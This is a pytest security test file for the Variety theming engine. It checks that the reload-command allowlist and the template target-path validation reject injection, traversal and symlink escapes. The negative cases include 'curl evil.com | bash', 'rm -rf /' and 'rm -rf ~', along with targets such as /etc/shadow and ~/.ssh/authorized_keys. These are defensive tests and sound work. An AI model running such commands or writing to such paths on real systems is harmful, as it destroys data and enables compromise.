"""Security tests for theming engine."""
import pytest
import os
from variety.smart_selection.theming import ThemeEngine, SAFE_RELOAD_EXECUTABLES


class TestReloadCommandSecurity:
    """Security tests for reload command validation."""

    @pytest.fixture
    def engine(self, tmp_path):
        """Create a ThemeEngine instance for testing."""
        # Create a minimal callback for testing
        def mock_get_palette(image_path):
            return {
                "background": "#1a1b26",
                "foreground": "#c0caf5",
                "color0": "#15161e",
            }

        # Create mock config files
        wallust_config = tmp_path / "wallust.toml"
        wallust_config.write_text("[templates]\n")

        variety_config = tmp_path / "theming.json"
        variety_config.write_text("{}")

        return ThemeEngine(
            get_palette_callback=mock_get_palette,
            wallust_config_path=str(wallust_config),
            variety_config_path=str(variety_config),
        )

    def test_safe_reload_executables_defined(self):
        """Allowlist should contain known safe executables."""
        assert "hyprctl" in SAFE_RELOAD_EXECUTABLES
        assert "killall" in SAFE_RELOAD_EXECUTABLES
        assert "i3-msg" in SAFE_RELOAD_EXECUTABLES

    def test_valid_reload_commands_allowed(self, engine):
        """Known safe commands should be allowed."""
        assert engine._validate_reload_command("hyprctl reload")
        assert engine._validate_reload_command("killall -SIGUSR2 waybar")
        assert engine._validate_reload_command("i3-msg reload")
        assert engine._validate_reload_command("swaymsg reload")

    def test_shell_injection_patterns_blocked(self, engine):
        """Shell metacharacters should be blocked."""
        assert not engine._validate_reload_command("echo $(whoami)")
        assert not engine._validate_reload_command("cat /etc/passwd; rm -rf /")
        assert not engine._validate_reload_command("curl evil.com | bash")

    def test_unknown_executable_blocked(self, engine):
        """Unknown executables should be blocked."""
        assert not engine._validate_reload_command("/tmp/malicious")
        assert not engine._validate_reload_command("rm -rf ~")
        assert not engine._validate_reload_command("python -c 'import os'")

    def test_empty_command_blocked(self, engine):
        """Empty or whitespace commands should be blocked."""
        assert not engine._validate_reload_command("")
        assert not engine._validate_reload_command("   ")

    def test_malformed_quoting_handled(self, engine):
        """Malformed shell quoting should not crash."""
        # Unclosed quote - shlex.split raises ValueError
        assert not engine._validate_reload_command("echo 'unclosed")
        assert not engine._validate_reload_command('echo "unclosed')

    def test_path_to_safe_executable_allowed(self, engine):
        """Full paths to safe executables should work."""
        assert engine._validate_reload_command("/usr/bin/killall -9 waybar")


class TestTargetPathSecurity:
    """Security tests for template target path validation."""

    @pytest.fixture
    def engine(self, tmp_path):
        """Create a ThemeEngine instance for testing."""
        # Create minimal wallust config
        wallust_config = tmp_path / "wallust.toml"
        wallust_config.write_text("[templates]\n")

        variety_config = tmp_path / "theming.json"

        def mock_palette(path):
            return {"background": "#000000", "foreground": "#ffffff"}

        return ThemeEngine(
            mock_palette,
            wallust_config_path=str(wallust_config),
            variety_config_path=str(variety_config),
        )

    def test_config_paths_allowed(self, engine):
        """Paths in ~/.config should be allowed."""
        config_path = os.path.expanduser("~/.config/kitty/colors.conf")
        assert engine._validate_target_path(config_path)

    def test_cache_paths_allowed(self, engine):
        """Paths in ~/.cache should be allowed."""
        cache_path = os.path.expanduser("~/.cache/variety/theme.json")
        assert engine._validate_target_path(cache_path)

    def test_local_paths_allowed(self, engine):
        """Paths in ~/.local should be allowed."""
        local_path = os.path.expanduser("~/.local/share/themes/colors")
        assert engine._validate_target_path(local_path)

    def test_tmp_paths_allowed(self, engine):
        """Paths in /tmp should be allowed."""
        assert engine._validate_target_path("/tmp/variety-theme.conf")

    def test_system_paths_rejected(self, engine):
        """System paths should be rejected."""
        assert not engine._validate_target_path("/etc/cron.d/evil")
        assert not engine._validate_target_path("/usr/bin/malicious")
        assert not engine._validate_target_path("/root/.bashrc")
        assert not engine._validate_target_path("/var/log/evil")

    def test_path_traversal_rejected(self, engine):
        """Path traversal attempts should be rejected."""
        traversal1 = os.path.expanduser("~/.config/../../../etc/passwd")
        assert not engine._validate_target_path(traversal1)
        assert not engine._validate_target_path("/tmp/../etc/shadow")
        assert not engine._validate_target_path("~/.config/../../etc/hosts")

    def test_home_root_rejected(self, engine):
        """Files directly in ~ (not in subdirs) should be rejected."""
        assert not engine._validate_target_path(os.path.expanduser("~/.bashrc"))
        assert not engine._validate_target_path(os.path.expanduser("~/.profile"))

    def test_ssh_paths_rejected(self, engine):
        """SSH directory should be rejected (not in allowed list)."""
        assert not engine._validate_target_path(
            os.path.expanduser("~/.ssh/authorized_keys")
        )

    def test_symlink_escape_rejected(self, engine, tmp_path):
        """Symlinks that escape allowed directories should be rejected."""
        # Create a symlink from allowed location to disallowed
        allowed_dir = tmp_path / "config"
        allowed_dir.mkdir()

        # Symlink pointing outside allowed dirs
        evil_link = allowed_dir / "evil_link"
        evil_link.symlink_to("/etc")

        # Target through symlink should be rejected after resolution
        target = str(evil_link / "passwd")
        assert not engine._validate_target_path(target)


class TestTemplateLoadingWithValidation:
    """Test that templates with invalid targets are rejected during loading."""

    @pytest.fixture
    def temp_dirs(self, tmp_path):
        """Create temporary directories for testing."""
        templates_dir = tmp_path / "templates"
        templates_dir.mkdir()
        output_dir = tmp_path / "output"
        output_dir.mkdir()
        return {
            "tmp_path": tmp_path,
            "templates_dir": templates_dir,
            "output_dir": output_dir,
        }

    def test_valid_template_loaded(self, temp_dirs):
        """Templates with valid targets are loaded."""
        tmp_path = temp_dirs["tmp_path"]
        templates_dir = temp_dirs["templates_dir"]

        # Create a template file
        template_file = templates_dir / "valid.conf"
        template_file.write_text("background = {{background}}\n")

        # Target in allowed directory
        target_path = os.path.expanduser("~/.config/test/colors.conf")

        # Create wallust config with valid target
        wallust_config = tmp_path / "wallust.toml"
        wallust_config.write_text(
            f'[templates]\n'
            f'valid = {{ template = "{template_file}", target = "{target_path}" }}\n'
        )

        variety_config = tmp_path / "theming.json"

        def mock_palette(path):
            return {"background": "#000000", "foreground": "#ffffff"}

        engine = ThemeEngine(
            mock_palette,
            wallust_config_path=str(wallust_config),
            variety_config_path=str(variety_config),
        )

        templates = engine.get_all_templates()
        assert len(templates) == 1
        assert templates[0].name == "valid"

    def test_invalid_template_rejected(self, temp_dirs):
        """Templates with invalid targets are not loaded."""
        tmp_path = temp_dirs["tmp_path"]
        templates_dir = temp_dirs["templates_dir"]

        # Create a template file
        template_file = templates_dir / "evil.conf"
        template_file.write_text("background = {{background}}\n")

        # Target in disallowed directory
        target_path = "/etc/cron.d/evil"

        # Create wallust config with invalid target
        wallust_config = tmp_path / "wallust.toml"
        wallust_config.write_text(
            f'[templates]\n'
            f'evil = {{ template = "{template_file}", target = "{target_path}" }}\n'
        )

        variety_config = tmp_path / "theming.json"

        def mock_palette(path):
            return {"background": "#000000", "foreground": "#ffffff"}

        engine = ThemeEngine(
            mock_palette,
            wallust_config_path=str(wallust_config),
            variety_config_path=str(variety_config),
        )

        # The template should be rejected during loading
        templates = engine.get_all_templates()
        assert len(templates) == 0

    def test_mixed_valid_invalid_templates(self, temp_dirs):
        """Only valid templates are loaded from a mixed config."""
        tmp_path = temp_dirs["tmp_path"]
        templates_dir = temp_dirs["templates_dir"]

        # Create template files
        valid_template = templates_dir / "valid.conf"
        valid_template.write_text("color = {{color0}}\n")

        evil_template = templates_dir / "evil.conf"
        evil_template.write_text("evil = {{background}}\n")

        # Valid and invalid targets
        valid_target = os.path.expanduser("~/.config/test/colors.conf")
        evil_target = "/etc/cron.d/evil"

        # Create wallust config with both
        wallust_config = tmp_path / "wallust.toml"
        wallust_config.write_text(
            f'[templates]\n'
            f'valid = {{ template = "{valid_template}", target = "{valid_target}" }}\n'
            f'evil = {{ template = "{evil_template}", target = "{evil_target}" }}\n'
        )

        variety_config = tmp_path / "theming.json"

        def mock_palette(path):
            return {"background": "#000000", "foreground": "#ffffff", "color0": "#ff0000"}

        engine = ThemeEngine(
            mock_palette,
            wallust_config_path=str(wallust_config),
            variety_config_path=str(variety_config),
        )

        # Only the valid template should be loaded
        templates = engine.get_all_templates()
        assert len(templates) == 1
        assert templates[0].name == "valid"
